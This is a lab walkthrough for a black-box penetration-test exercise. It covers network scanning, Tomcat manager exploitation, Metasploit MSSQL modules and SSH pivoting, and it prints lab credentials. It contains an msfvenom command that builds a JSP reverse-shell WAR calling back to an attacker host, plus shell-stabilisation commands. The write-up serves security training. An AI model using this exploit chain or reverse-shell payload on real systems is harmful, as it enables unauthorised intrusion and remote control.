# Black-box Penetration Test 1

## Scenario

* You have been engaged in a Black-box Penetration Test (`172.16.64.0/24` range). Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.
* Some machines are exploitable instantly but some might require exploiting other ones first. Enumerate every compromised machine to identify valuable information, that will help you proceed further into the environment.
* If you are stuck on one of the machines, don't overthink and start pentesting another one.
* When you read the flag file, you can be sure that the machine was successfully compromised. But keep your eyes open - apart from the flag, other useful information may be present on the system.

> This is not a CTF! The flags' purpose is to help you identify if you fully compromised a machine or not.
>
> The solutions contain the shortest path to compromise each machine. You should follow the penetration testing process covered in its entirety!

## Goals

* Discover and exploit all the machines on the network.
* Read all flag files (one per machine)

## What you will learn

* How to exploit Apache Tomcat
* How to exploit SQL Server
* Post-exploitation discovery
* Arbitrary file upload exploitation

## Recommended tools

* Dirb
* Metasploit framework (recommended version: 5)&#x20;
* Nmap&#x20;
* Netcat

## My Solution

## Information Gathering

```bash
nmap -sC -sV 172.16.64.0/24
```

```bash
$ nmap -sC -sV 172.16.64.0/24 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 09:52 EST
Nmap scan report for 172.16.64.10
Host is up (0.000028s latency).
All 1000 scanned ports on 172.16.64.10 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 172.16.64.101
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache2 Ubuntu Default Page: It works
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: PUT DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.140
Host is up (0.062s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 HTML Template by Colorlib

Nmap scan report for 172.16.64.182
Host is up (0.044s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.199
Host is up (0.051s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2022-01-29T14:52:50+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-01-29T12:27:58
|_Not valid after:  2052-01-29T12:27:58
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   172.16.64.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: -6s, deviation: 0s, median: -6s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN10, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a2:e9:b9 (VMware)
| smb2-time: 
|   date: 2022-01-29T14:52:45
|_  start_date: 2022-01-29T12:27:53

Post-scan script results:
| ssh-hostkey: Possible duplicate hosts
| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA) used by:
|   172.16.64.101
|   172.16.64.182
| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519) used by:
|   172.16.64.101
|   172.16.64.182
| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA) used by:
|   172.16.64.101
|_  172.16.64.182
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 44.77 seconds
```

### 172.16.64.101

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache2 Ubuntu Default Page: It works
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: PUT DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 172.16.64.140

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 HTML Template by Colorlib
```

### 172.16.64.182

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 172.16.64.199

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2022-01-29T14:52:50+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-01-29T12:27:58
|_Not valid after:  2052-01-29T12:27:58
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration - 172.16.64.101

### Dirb

```bash
dirb http://172.16.64.101:8080/
dirb http://172.16.64.101:9080/
```

![](<../../../.gitbook/assets/image (42).png>)

![](<../../../.gitbook/assets/image (68).png>)

![](<../../../.gitbook/assets/image (50).png>)

```
tomcat:s3cret
```

### Exploitation

![](<../../../.gitbook/assets/image (56).png>)

```
use exploit/multi/http/tomcat_mgr_upload)
```

![](<../../../.gitbook/assets/image (15).png>)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o revshell.war
```

![](<../../../.gitbook/assets/image (58).png>)

![](<../../../.gitbook/assets/image (30).png>)

![](<../../../.gitbook/assets/image (13).png>)

![](<../../../.gitbook/assets/image (61) (1).png>)

![](<../../../.gitbook/assets/image (64).png>)

![](<../../../.gitbook/assets/image (14).png>)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

![](<../../../.gitbook/assets/image (21).png>)

![](<../../../.gitbook/assets/image (23).png>)

![](<../../../.gitbook/assets/image (39).png>)

```
tomcat:tomcat
tomcat:s3cret
role1:tomcat
```

![](<../../../.gitbook/assets/image (40).png>)

![](<../../../.gitbook/assets/image (17).png>)

![](<../../../.gitbook/assets/image (27).png>)

![](<../../../.gitbook/assets/image (22) (1).png>)

![](<../../../.gitbook/assets/image (55).png>)

## Enumeration - 172.16.64.140

![](<../../../.gitbook/assets/image (53).png>)

![](<../../../.gitbook/assets/image (41).png>)

> The HyperText Transfer Protocol (HTTP) 401 Unauthorized response status code indicates that the client request has not been completed because it lacks valid authentication credentials for the requested resource.

![](<../../../.gitbook/assets/image (57).png>)

```
admin:admin
```

![](<../../../.gitbook/assets/image (65).png>)

![](<../../../.gitbook/assets/image (67).png>)

![](<../../../.gitbook/assets/image (9).png>)

![](<../../../.gitbook/assets/image (60).png>)

![](<../../../.gitbook/assets/image (52).png>)

### Exploitation + Credentials

![](<../../../.gitbook/assets/image (36).png>)

```
Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt
```

![](<../../../.gitbook/assets/image (69).png>)

## Enumeration - 172.16.64.199

```
use auxiliary/scanner/mssql/mssql_login 
```

![](<../../../.gitbook/assets/image (34).png>)

{% embed url="https://www.offensive-security.com/metasploit-unleashed/hunting-mssql" %}

```
use auxiliary/admin/mssql/mssql_exec
```

![](<../../../.gitbook/assets/image (59).png>)

{% embed url="https://www.offensive-security.com/metasploit-unleashed/payloads-mssql" %}

```
use windows/mssql/mssql_payload
```

![](<../../../.gitbook/assets/image (4).png>)

![](<../../../.gitbook/assets/image (63).png>)

![](<../../../.gitbook/assets/image (66).png>)

![](<../../../.gitbook/assets/image (54).png>)

![](<../../../.gitbook/assets/image (32).png>)

![](<../../../.gitbook/assets/image (38).png>)

```
ssh://developer:dF3334slKw@172.16.64.182:22
username: developer
password: dF3334slKw
```

## SSH - 172.16.64.182

```
ssh developer@172.16.64.182
```

![](<../../../.gitbook/assets/image (62).png>)

![](<../../../.gitbook/assets/image (18).png>)

### Flag

![](<../../../.gitbook/assets/image (51).png>)

